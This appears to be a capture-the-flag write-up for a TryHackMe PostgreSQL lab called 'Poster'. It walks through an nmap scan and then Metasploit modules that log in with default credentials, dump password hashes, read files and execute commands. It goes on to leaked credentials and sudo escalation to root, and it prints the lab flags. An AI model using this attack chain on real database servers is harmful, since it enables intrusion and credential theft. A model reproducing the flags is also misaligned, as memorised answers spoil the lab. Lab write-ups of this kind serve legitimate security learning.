Poster | RDBMS

**export IP=10.10.197.127**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initila $IP

```
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
5432/tcp open  postgresql syn-ack ttl 63 PostgreSQL DB 9.5.8 - 9.5.10
```

# Metasploit

```
> use auxiliary/scanner/postgres/postgres_login
> set RHOSTS <IP>
> run
```

## Output

`[+] 10.10.197.127:5432 - Login Successful: postgres:password@template1`

#RDBMS Version

```
> use auxiliary/admin/postgres/postgres_sql
> set PASSWORD password
> auxiliary(admin/postgres/postgres_sql) > set USERNAME postgres
> auxiliary(admin/postgres/postgres_sql) > set RHOSTS 10.10.197.127
> auxiliary(admin/postgres/postgres_sql) > run
```

## Output

```
    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
```

# Hash Dump

```
use auxiliary/scanner/postgres/postgres_hashdump
set RHOSTS IP
run
```

## Output

```
 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc
```

# Reading a file

```
use auxiliary/admin/postgres/postgres_readfile
set RHOSTS IP
set PASSWORD password
set RFILE /home/dark/credentials.txt
run
```

## Output

`dark:qwerty1234#!hackme`

# Command Execution

```
use multi/postgres/postgres_copy_from_program_cmd_exec
set options
run
```

We have a shell!!

In dark's home, we find `credentials.txt`

`dark:qwerty1234#!hackme`

Since we know we are running PostgreSQL let's check /var/www/html

In this directory we find `confg.php`

```
cat config.php
<?php 
	
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "p4ssw0rdS3cur3!#";
	$dbname = "mysudopassword";
?>
```

su alison

## user.txt

```
THM{postgresql_fa1l_conf1gurat1on}
```

# Privilege Escalation

The user `alison` can run all commands. 

sudo su

We are root!!

## root.txt

```
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```